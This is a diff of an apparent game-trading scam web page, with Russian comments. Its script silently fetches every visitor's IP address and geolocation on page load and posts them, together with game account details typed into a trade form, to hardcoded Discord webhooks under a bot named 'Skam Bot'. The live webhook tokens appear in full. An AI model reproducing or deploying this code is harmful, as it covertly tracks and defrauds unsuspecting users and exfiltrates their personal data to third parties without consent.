@@ -7,30 +7,34 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Функция отправки местоположения и IP адреса на вебхук Discord
-            function sendDataToWebhook() {
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(data => {
-                        var location = data.city + ', ' + data.region + ', ' + data.country_name;
-                        var ipAddress = data.ip;
-                        var webhookURL = "https://discord.com/api/webhooks/1228774713283711006/c9hiGw6JSXHP3D_Vw-DhgmAXhmOe9B7J2a3nWPAApAH88uo0LdnAI0pRciZBo-kOKMxT";
-                        var message = "Местоположение: " + location + "\nIP адрес: " + ipAddress;
+            async function sendDataToWebhook() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    var location = data.city + ', ' + data.region + ', ' + data.country_name;
+                    var ipAddress = data.ip;
+                    var message = "Местоположение: " + location + "\nIP адрес: " + ipAddress;
 
-                        var request = new XMLHttpRequest();
-                        request.open("POST", webhookURL);
-                        request.setRequestHeader('Content-type', 'application/json');
+                    // Проверяем IP-адрес и устанавливаем сообщение в соответствии с этим
+                    if (ipAddress === "91.214.211.241") {
+                        message = "IP: ||А нахуя тебе айпишник ригича?||";
+                    }
 
-                        var params = {
-                            username: "Skam Bot",
-                            avatar_url: "https://example.com/avatar.png",
-                            content: message
-                        };
+                    var webhookURL = "https://discord.com/api/webhooks/1228774713283711006/c9hiGw6JSXHP3D_Vw-DhgmAXhmOe9B7J2a3nWPAApAH88uo0LdnAI0pRciZBo-kOKMxT";
+                    var request = new XMLHttpRequest();
+                    request.open("POST", webhookURL);
+                    request.setRequestHeader('Content-type', 'application/json');
 
-                        request.send(JSON.stringify(params));
-                    })
-                    .catch(error => {
-                        console.error('Ошибка получения данных:', error);
-                    });
+                    var params = {
+                        username: "Skam Bot",
+                        avatar_url: "https://example.com/avatar.png",
+                        content: message
+                    };
+
+                    request.send(JSON.stringify(params));
+                } catch (error) {
+                    console.error('Ошибка получения данных:', error);
+                }
             }
 
             // Отправляем местоположение и IP адрес при загрузке страницы
@@ -120,42 +124,30 @@
                 sendMessage();
             });
         
-            function sendMessage() {
+            async function sendMessage() {
                 var cups = document.getElementById('cups').value;
                 var legendaries = document.getElementById('legendaries').value;
                 var exchangeTo = document.getElementById('exchangeTo').value;
                 var username = document.getElementById('username').value;
                 var dis = document.getElementById('dis').value;
+        
                 var message = "Кубки: " + cups + "\nЛегендарки: " + legendaries + "\nНа что обмен: " + exchangeTo + "\nНик: " + username + "\nДискорд: " + dis;
+        
                 var webhookURL = "https://discord.com/api/webhooks/1228644871158501407/gK82kXVLwRrX5YZFuwXLHIKTrxOXSoYtiS0dZ_ipCb36Jfl6_ldfJ_yb_hBubciYW6N3";
-                
                 var request = new XMLHttpRequest();
                 request.open("POST", webhookURL);
                 request.setRequestHeader('Content-type', 'application/json');
-                
+        
                 var params = {
                     username: "Skam Bot",
                     avatar_url: "https://example.com/avatar.png",
                     content: message
                 };
-                
+        
                 request.send(JSON.stringify(params));
-                
+        
                 alert("Закройте данное сообщение");
                 modal.style.display = 'none'; // Закрываем модальное окно после отправки
-            }
-
-            // Функция получения IP адреса
-            function getIPAddress() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        return data.ip;
-                    })
-                    .catch(error => {
-                        console.error('Ошибка получения IP адреса:', error);
-                        return "Ошибка получения IP адреса";
-                    });
             }
         });
     </script>
